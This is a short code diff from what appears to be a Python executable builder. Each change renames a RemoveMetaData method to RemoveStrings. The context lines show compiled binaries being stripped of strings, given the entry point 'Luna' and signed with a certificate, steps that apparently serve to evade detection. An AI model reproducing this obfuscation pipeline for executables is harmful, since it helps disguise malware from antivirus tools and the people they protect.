@@ -661,7 +661,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 					command.insert(-1, module)
 
 				subprocess.run(command)
-				self.RemoveMetaData(f"./{filename}.exe")
+				self.RemoveStrings(f"./{filename}.exe")
 				self.RenameEntryPoint(f"./{filename}.exe", "Luna")
 				self.AddCertificate(f"./{filename}.exe")
 				logging.info(f"Successfully compiled {filename}.exe with pyinstaller")
@@ -694,7 +694,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 						logging.info(f"Successfully compiled {filename}.exe with nuitka")
 					except Exception as e:
 						logging.error(f"Error with compiling file: {e}")
-				self.RemoveMetaData(f"./{filename}.exe")
+				self.RemoveStrings(f"./{filename}.exe")
 				self.RenameEntryPoint(f"./{filename}.exe", "Luna")
 				self.AddCertificate(f"./{filename}.exe")
 
@@ -803,7 +803,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 		if os.path.isfile(certFile):
 			signfile(path, certFile, path)
 
-	def RemoveMetaData(self, path: str):
+	def RemoveStrings(self, path: str):
 		print("Removing MetaData")
 		with open(path, "rb") as file:
 			data = file.read()
